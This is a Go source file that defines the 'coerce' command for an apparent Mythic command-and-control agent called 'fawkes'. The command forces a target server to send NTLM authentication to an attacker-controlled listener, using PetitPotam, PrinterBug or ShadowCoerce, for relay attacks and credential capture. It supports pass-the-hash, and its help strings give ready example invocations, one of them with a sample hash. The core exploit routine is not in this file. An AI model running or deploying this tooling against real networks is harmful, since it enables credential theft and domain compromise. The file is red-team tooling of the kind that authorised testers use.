package agentfunctions

import (
	"fmt"
	"path/filepath"
	"strconv"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "coerce",
		Description:         "NTLM authentication coercion — force a target server to authenticate to a listener via MS-EFSR (PetitPotam), MS-RPRN (PrinterBug), or MS-FSRVP (ShadowCoerce). Used for NTLM relay attacks and credential capture. Supports pass-the-hash.",
		HelpString:          "coerce -server dc01.domain.local -listener 10.0.0.5 -method petitpotam -username DOMAIN\\user -password pass\ncoerce -server 192.168.1.1 -listener 10.0.0.5 -method all -username admin -hash aad3b435b51404ee:8846f7eaee8fb117\ncoerce -server dc01 -listener 10.0.0.5 -method printerbug -username user@domain.local -password pass",
		Version:             1,
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1187"},
		AssociatedBrowserScript: &agentstructs.BrowserScript{
			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "coerce_new.js"),
			Author:     "@galoryber",
		},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{
				agentstructs.SUPPORTED_OS_WINDOWS,
				agentstructs.SUPPORTED_OS_LINUX,
				agentstructs.SUPPORTED_OS_MACOS,
			},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:                 "server",
				CLIName:              "server",
				ModalDisplayName:     "Target Server",
				Description:          "Server to coerce (IP or hostname) — this server will authenticate to the listener",
				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:         "",
				DynamicQueryFunction: getActiveHostList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default"},
				},
			},
			{
				Name:             "listener",
				CLIName:          "listener",
				ModalDisplayName: "Listener Host",
				Description:      "Attacker-controlled host to receive NTLM authentication (IP or hostname, e.g., Responder/ntlmrelayx)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default"},
				},
			},
			{
				Name:             "method",
				CLIName:          "method",
				ModalDisplayName: "Coercion Method",
				Description:      "Method: petitpotam (MS-EFSR), printerbug (MS-RPRN), shadowcoerce (MS-FSRVP), or all",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				DefaultValue:     "all",
				Choices:          []string{"all", "petitpotam", "printerbug", "shadowcoerce"},
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "username",
				CLIName:          "username",
				ModalDisplayName: "Username",
				Description:      "Account for RPC authentication (DOMAIN\\user or user@domain)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				DynamicQueryFunction: getCallbackUserList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default"},
				},
			},
			{
				Name:             "password",
				CLIName:          "password",
				ModalDisplayName: "Password",
				Description:      "Password for authentication (or use -hash for pass-the-hash)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "hash",
				CLIName:          "hash",
				ModalDisplayName: "NTLM Hash",
				Description:      "NT hash for pass-the-hash (LM:NT or just NT)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "domain",
				CLIName:          "domain",
				ModalDisplayName: "Domain",
				Description:      "Domain name (auto-detected from username if DOMAIN\\user or user@domain format)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				DynamicQueryFunction: getCallbackDomainList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "timeout",
				CLIName:          "timeout",
				ModalDisplayName: "Timeout (seconds)",
				Description:      "Operation timeout in seconds (default: 30)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				DefaultValue:     30,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
		},
		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
				TaskID:              taskData.Task.ID,
				Success:             true,
				OpsecPostBlocked:    false,
				OpsecPostMessage:    "OPSEC AUDIT: Authentication coercion completed. NTLM authentication attempts from target servers generate Event ID 4624/4625 and SMB connection logs. Coerced connections may be visible in NDR and firewall logs.",
				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			// Try JSON first (from API/modal)
			if err := args.LoadArgsFromJSONString(input); err == nil {
				return nil
			}
			// Plain text: parse -flag value pairs
			parts := strings.Fields(input)
			for i := 0; i < len(parts); i++ {
				switch parts[i] {
				case "-server", "-target":
					if i+1 < len(parts) {
						i++
						args.SetArgValue("server", parts[i])
					}
				case "-listener":
					if i+1 < len(parts) {
						i++
						args.SetArgValue("listener", parts[i])
					}
				case "-method":
					if i+1 < len(parts) {
						i++
						args.SetArgValue("method", parts[i])
					}
				case "-username", "-user":
					if i+1 < len(parts) {
						i++
						args.SetArgValue("username", parts[i])
					}
				case "-password", "-pass":
					if i+1 < len(parts) {
						i++
						args.SetArgValue("password", parts[i])
					}
				case "-hash":
					if i+1 < len(parts) {
						i++
						args.SetArgValue("hash", parts[i])
					}
				case "-domain":
					if i+1 < len(parts) {
						i++
						args.SetArgValue("domain", parts[i])
					}
				case "-timeout":
					if i+1 < len(parts) {
						i++
						if t, err := strconv.Atoi(parts[i]); err == nil {
							args.SetArgValue("timeout", t)
						}
					}
				}
			}
			return nil
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			method, _ := taskData.Args.GetStringArg("method")
			msg := fmt.Sprintf("OPSEC WARNING: NTLM authentication coercion (method: %s). Forces target to authenticate, generating network traffic and authentication logs. MS-EFSR/MS-RPRN/MS-FSRVP are well-known attack vectors commonly monitored by SOC teams (T1187).", method)
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID: taskData.Task.ID, Success: true,
				OpsecPreBlocked: false, OpsecPreMessage: msg,
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}

			server, _ := taskData.Args.GetStringArg("server")
			listener, _ := taskData.Args.GetStringArg("listener")
			method, _ := taskData.Args.GetStringArg("method")

			displayMsg := fmt.Sprintf("coerce %s → %s (%s)", server, listener, method)
			response.DisplayParams = &displayMsg

			createArtifact(taskData.Task.ID, "Network Connection", fmt.Sprintf("NTLM coercion: %s → %s via %s", server, listener, method))

			return response
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			server, _ := processResponse.TaskData.Args.GetStringArg("server")
			listener, _ := processResponse.TaskData.Args.GetStringArg("listener")
			// Track successful coercion attempts
			for _, line := range strings.Split(responseText, "\n") {
				lower := strings.ToLower(line)
				if strings.Contains(lower, "success") || strings.Contains(lower, "triggered") {
					method := "unknown"
					for _, m := range []string{"petitpotam", "printerbug", "shadowcoerce", "MS-EFSR", "MS-RPRN", "MS-FSRVP"} {
						if strings.Contains(strings.ToLower(responseText), strings.ToLower(m)) {
							method = m
							break
						}
					}
					createArtifact(processResponse.TaskData.Task.ID, "Network Connection",
						fmt.Sprintf("[Coerce] Successful: %s authenticated to %s via %s", server, listener, method))
					break
				}
			}
			return response
		},
	})
}
